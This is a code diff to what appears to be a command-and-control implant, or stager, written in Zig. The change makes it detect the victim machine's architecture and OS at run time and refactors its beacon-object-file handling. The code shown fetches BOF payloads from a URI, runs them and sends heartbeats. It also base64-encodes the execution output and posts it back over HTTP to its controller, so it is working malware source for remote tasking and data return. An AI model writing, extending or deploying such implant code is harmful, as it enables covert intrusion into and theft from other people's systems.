@@ -66,19 +66,22 @@ fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]u8 {
 }
 
 pub fn main() !u8 {
-
-    // TODO get it from victim machine
-    const arch = "x86_64";
-    const os = "linux";
-    const authz = arch ++ ":" ++ os;
-
     const stdout = std.io.getStdOut();
-
-    stdout.writer().print("Hello! baby stager here!\n", .{}) catch unreachable;
 
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
+
+    const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
+
+    const arch_name = target.cpu.model.name;
+    const os_name = @tagName(target.os.tag);
+    const authz = try std.mem.join(allocator, "", &.{ arch_name, ":", os_name });
+    defer allocator.free(authz);
+
+    //stdout.writer().print("{s}\n", .{authz}) catch unreachable;
+
+    stdout.writer().print("Hello! baby stager here!\n", .{}) catch unreachable;
 
     var heartbeat_header = std.http.Headers{ .allocator = allocator };
     defer heartbeat_header.deinit();
@@ -194,11 +197,11 @@ pub fn main() !u8 {
                     stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;
                 }
 
-                if (bof_context != null) if (bof_context.?.getOutput()) |bofOutput| {
-                    stdout.writer().print("Bof output:\n{s}", .{bofOutput}) catch unreachable;
-                    const out_b64 = try allocator.alloc(u8, base64_encoder.calcSize(bofOutput.len));
+                if (bof_context) |context| if (context.getOutput()) |output| {
+                    stdout.writer().print("Bof output:\n{s}", .{output}) catch unreachable;
+                    const out_b64 = try allocator.alloc(u8, base64_encoder.calcSize(output.len));
                     defer allocator.free(out_b64);
-                    _ = std.base64.Base64Encoder.encode(&base64_encoder, out_b64, bofOutput);
+                    _ = std.base64.Base64Encoder.encode(&base64_encoder, out_b64, output);
 
                     var h = std.http.Headers{ .allocator = allocator };
                     defer h.deinit();
@@ -215,8 +218,7 @@ pub fn main() !u8 {
                     try reqRes.finish();
 
                     bof_object.release();
-                    bof_context.?.release();
-                    bof_context = null;
+                    context.release();
                 };
 
                 // tasked to execute builtin command?
